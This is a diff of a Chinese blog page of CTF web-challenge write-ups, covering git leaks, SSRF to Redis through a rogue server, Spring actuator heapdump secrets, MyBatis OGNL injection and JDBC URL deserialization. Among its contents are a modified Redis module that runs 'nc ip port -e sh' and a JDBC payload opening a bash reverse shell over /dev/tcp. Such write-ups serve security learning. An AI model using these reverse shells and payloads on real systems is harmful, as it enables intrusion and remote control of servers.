@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -198,13 +198,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-count">84</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -314,7 +314,7 @@
 <h2 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h2><p>要用这个工具才能找到git泄露<a target="_blank" rel="noopener" href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></p>
 <p>githack拉取不到</p>
 <p>然后翻源码能找到</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696134140917-f87d509a-66bf-4a36-aa10-a94c2ff9944a.png" alt="img">     </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696134140917-f87d509a-66bf-4a36-aa10-a94c2ff9944a.png" alt="img">	 </p>
 <h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><p>操你妈不知道是我这里校园网的原因 环境一直像狗屎一样恶心我</p>
 <p>文件上传一直访问不到文件 sql注入一直转圈链接失败</p>
 <h2 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="[Week 2] ez_upload"></a>[Week 2] ez_upload</h2><p>考点:</p>
@@ -402,7 +402,7 @@
 <p>大致思路为它会通过http协议去访问一个网站 然后将其访问到的内容通过xml解析出来 然后正则匹配相关的内容 然后帮我们渲染出来</p>
 <p><code>resolve_entities=True</code>重点关注这个 如果这个选项被设置为了true 那么它就会帮我们解析xml实体</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598725169-4234b27f-2cd7-4f45-9a3d-a74ee5c59a88.png" alt="img"></p>
-<p>来自：<a target="_blank" rel="noopener" href="https://github.com/MisakiKata/python_code_audit/blob/master/XXE.md">python_code_audit/XXE.md at master · MisakiKata/python_code_audit</a></p>
+<p>来自：<a target="_blank" rel="noopener" href="https://github.com/MisakiKata/python_code_audit/blob/master/XXE.md">python_code_audit&#x2F;XXE.md at master · MisakiKata&#x2F;python_code_audit</a></p>
 <p>除此之外<code>debug=True</code>这意味着 如果我们能计算出pin值 我们就可以通过<code>/console</code>直接进行rce</p>
 <p>所以我们的思路就是:</p>
 <ol>
@@ -449,12 +449,12 @@
 <p>cache.php</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">preg_match</span>(<span class="string">&#x27;/^[a-f0-9]&#123;32&#125;$/&#x27;</span>, $id)) &#123;</span><br><span class="line">    <span class="title function_">die</span>(<span class="string">&#x27;Invalid ID&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">$redis-&gt;<span class="title function_">connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;<span class="title function_">slaveOf</span>();</span><br><span class="line"></span><br><span class="line">$data = $redis-&gt;<span class="title function_">get</span>($id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($data) &#123;</span><br><span class="line">    echo $data;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">die</span>(<span class="string">&#x27;No snapshot found!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>简单审计就能看到index.php中存在ssrf 并且限制了只能以http/https协议</p>
-<p>当然curl除了http/https协议外还支持dict/gopher协议</p>
+<p>简单审计就能看到index.php中存在ssrf 并且限制了只能以http&#x2F;https协议</p>
+<p>当然curl除了http&#x2F;https协议外还支持dict&#x2F;gopher协议</p>
 <p>再来看<code>curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);</code></p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018226430-3410ab03-23a4-4712-85ae-d877557cdeb5.png" alt="img"></p>
 <p>当其被设置为true时 会根据服务器http头中的location进行重定向</p>
-<p>二者结合起来 我们就可以通过 Location 头把协议从 http 重定向至 dict / gopher</p>
+<p>二者结合起来 我们就可以通过 Location 头把协议从 http 重定向至 dict &#x2F; gopher</p>
 <p>再审计cache.php和ping.php可知 web服务和redis服务不在一个服务器上</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018653945-607c1987-eeb6-425d-a26f-f9f4ac81ed90.png" alt="img"></p>
 <p>这就导致我们没法直接通过写入文件getshell</p>
@@ -475,12 +475,12 @@
 
 <p>在vps起个php文件用<code>php -S 0.0.0.0:port</code>或者用nginx，apache都行</p>
 <p>让题目去依次访问这两个文件</p>
-<p>再起个恶意redis server 推荐：<a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">GitHub - Testzero-wz/Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement</a></p>
+<p>再起个恶意redis server 推荐：<a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">GitHub - Testzero-wz&#x2F;Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement</a></p>
 <p> 恶意Server使用，-v为恶意Server模式，指定port和恶意文件开启监听  </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -lport 8888 -path exp.so  </span><br></pre></td></tr></table></figure>
 
 <p>这里恶意so文件由Aecous师傅完成的真的tql</p>
-<p>魔改RedisModulesSDK/exp/exp.c一个函数，make编译后生成exp.so文件  项目地址：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
+<p>魔改RedisModulesSDK&#x2F;exp&#x2F;exp.c一个函数，make编译后生成exp.so文件  项目地址：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
 <p>魔改内容为：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int <span class="title class_">RevShellCommand</span>(<span class="title class_">RedisModuleCtx</span> *ctx, <span class="title class_">RedisModuleString</span> **argv, int argc) &#123;</span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>) &#123;</span><br><span class="line">		size_t cmd_len;</span><br><span class="line">		char *ip = <span class="title class_">RedisModule</span>_StringPtrLen(argv[<span class="number">1</span>], &amp;cmd_len);</span><br><span class="line">		char *port_s = <span class="title class_">RedisModule</span>_StringPtrLen(argv[<span class="number">2</span>], &amp;cmd_len);</span><br><span class="line">		int port = <span class="title function_">atoi</span>(port_s);</span><br><span class="line">        int pid;</span><br><span class="line">		char * succ= <span class="string">&quot;+OK&quot;</span>;</span><br><span class="line">		pid = <span class="title function_">fork</span>();</span><br><span class="line">		<span class="keyword">if</span> (pid || pid == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title class_">RedisModuleString</span> *ret = <span class="title class_">RedisModule</span>_CreateString(ctx, succ, <span class="title function_">strlen</span>(succ));</span><br><span class="line">            <span class="title class_">RedisModule</span>_ReplyWithString(ctx, ret);</span><br><span class="line">		    <span class="title class_">RedisModule</span>_FreeString(ctx,ret);</span><br><span class="line">			<span class="keyword">return</span> <span class="variable constant_">REDISMODULE_OK</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="title function_">system</span>(<span class="string">&quot;nc ip port -e sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable constant_">REDISMODULE_OK</span>;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">RedisModule</span>_WrongArity(ctx);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">REDISMODULE_OK</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -512,7 +512,7 @@
 <p>首先访问<code>/actuator/env </code>查看环境变量发现flag是密码 密码被改为星号了</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698847740633-7aee6a12-a838-4b4c-8942-1c94351320e3.png" alt="img"></p>
 <p>访问<code>/actuator/headdump</code> </p>
-<p>spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防⽌敏感信息泄露 但是我们可以通过 /actuator/heapdump 这个路由去导出 jvm 中的堆内存信息, 然后通过⼀定的查询得到 app.password 的明文</p>
+<p>spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防⽌敏感信息泄露 但是我们可以通过 &#x2F;actuator&#x2F;heapdump 这个路由去导出 jvm 中的堆内存信息, 然后通过⼀定的查询得到 app.password 的明文</p>
 <p>这里我用的是MAT工具<a target="_blank" rel="noopener" href="https://eclipse.dev/mat/">Eclipse Memory Analyzer Open Source Project | The Eclipse Foundation</a></p>
 <p>查询语句：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM java.util.LinkedHashMap$Entry x WHERE(toString(x.key).contains(&quot;app.password&quot;))</span><br></pre></td></tr></table></figure>
@@ -557,13 +557,13 @@
 <h2 id="Week-4-YourBatis-学习"><a href="#Week-4-YourBatis-学习" class="headerlink" title="[Week 4] YourBatis(学习)"></a>[Week 4] YourBatis(学习)</h2><p>考点：</p>
 <ul>
 <li>MyBatis低版本OGNL注入</li>
-<li> OGNL 表达式注入</li>
+<li>OGNL 表达式注入</li>
 </ul>
 <p>首先将给的jar包进行反编译 在idea打开</p>
 <p>首先查看依赖 发现存在MyBatis依赖 并且是低版本2.1.1 该版本存在OGNL表达式注入</p>
 <p>之后开个篇章学习一下 WP就不过多赘述了</p>
 <p>推荐：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1749">奇安信攻防社区-从一道CTF题浅谈MyBatis与Ognl的那些事</a><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1227.html">Mybatis 从SQL注入到OGNL注入 - panda | 热爱安全的理想少年</a></p>
-<p>存在一个/user路由 </p>
+<p>存在一个&#x2F;user路由 </p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699177350194-f8a3b765-c6f6-43ac-a960-ba1e8243dda6.png" alt="img"></p>
 <p>主要代码如下</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">package com.<span class="property">example</span>.<span class="property">yourbatis</span>.<span class="property">provider</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">ibatis</span>.<span class="property">jdbc</span>.<span class="property">SQL</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">UserSqlProvider</span> &#123;</span><br><span class="line">    public <span class="title class_">UserSqlProvider</span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">String</span> <span class="title function_">buildGetUsers</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="params"></span>) &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">SELECT</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">FROM</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">String</span> <span class="title function_">buildGetUserByUsername</span>(<span class="params">final <span class="built_in">String</span> username</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="params"></span>) &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">SELECT</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">FROM</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">WHERE</span>(<span class="title class_">String</span>.<span class="title function_">format</span>(<span class="string">&quot;username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -581,12 +581,12 @@
 <p>java基础知识还是缺少很多 得去狂补</p>
 <h2 id="Week-4-TestConnection（学习）"><a href="#Week-4-TestConnection（学习）" class="headerlink" title="[Week 4] TestConnection（学习）"></a>[Week 4] TestConnection（学习）</h2><p>考点：</p>
 <ul>
-<li> MySQL / PostgreSQL JDBC URL Attack  </li>
+<li>MySQL &#x2F; PostgreSQL JDBC URL Attack</li>
 </ul>
 <h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>直接看官方WP</p>
 <blockquote>
 <p>JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问</p>
-<p>JDBC URL 就是用于连接数据库的字符串, 格式为 jdbc:db-type://host:port/db-name?param=value</p>
+<p>JDBC URL 就是用于连接数据库的字符串, 格式为 jdbc:db-type:&#x2F;&#x2F;host:port&#x2F;db-name?param&#x3D;value</p>
 <p>db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite</p>
 <p>db-name 是要使用的数据库名</p>
 <p>param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等</p>
@@ -596,7 +596,7 @@
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186012686-7dcd51eb-5b46-4a88-87ec-b6c194602a72.png" alt="img"></p>
 <p>根据mysql版本8.0.11 找到对应的驱动利用 <a target="_blank" rel="noopener" href="https://tttang.com/archive/1877/#toc_">MYSQL JDBC反序列化解析 - 跳跳糖</a></p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186082246-dff3269f-5cf5-4f74-8ccc-970c455b1052.png" alt="img"></p>
-<p>或者用工具生成payload<a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server">GitHub - 4ra1n/mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用)</a></p>
+<p>或者用工具生成payload<a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server">GitHub - 4ra1n&#x2F;mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用)</a></p>
 <p>注意这里选用的CC6的链子 这也就是为什么要给依赖让我们知道是<code>commons-collections-3.2.1</code></p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699190566032-86255c59-cffd-4d1d-a011-01a2973cec93.png" alt="img"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
@@ -649,6 +649,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/post/60ce7176.html" rel="next" title="Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习">
+                  Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习 <i class="fa fa-chevron-right"></i>
+                </a>
             </div>
           </div>
     </footer>
